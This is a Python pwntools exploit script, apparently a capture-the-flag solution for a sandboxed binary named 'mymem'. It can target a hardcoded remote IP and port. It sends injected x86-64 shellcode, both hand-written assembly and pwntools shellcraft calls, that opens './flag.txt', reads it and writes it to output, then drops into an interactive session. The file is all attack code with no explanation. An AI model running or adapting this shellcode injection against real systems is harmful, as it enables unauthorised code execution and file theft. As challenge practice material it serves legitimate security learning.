from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["43.143.7.127",28635]
#libc=ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./mymem")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

gdb.attach(p)

ru(b'sandbox\n')
shellcode = asm('''
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax    
    mov rdi,rsp
    xor esi,esi 
    mov eax,2
    syscall
    mov edi,eax
    mov rsi,rsp
    mov rdx,0x10
    xor eax,eax
    syscall
    xor edi,2 
    mov rsi,rsp
    mov rdx,0x10
    mov eax,edi
    syscall 
    ''')

shellcode = asm(shellcraft.open('./flag.txt'))
shellcode += asm(shellcraft.read(3, 0x50064, 0x30))
shellcode += asm(shellcraft.write(1, 0x50064, 0x30))

s(shellcode)

shell()
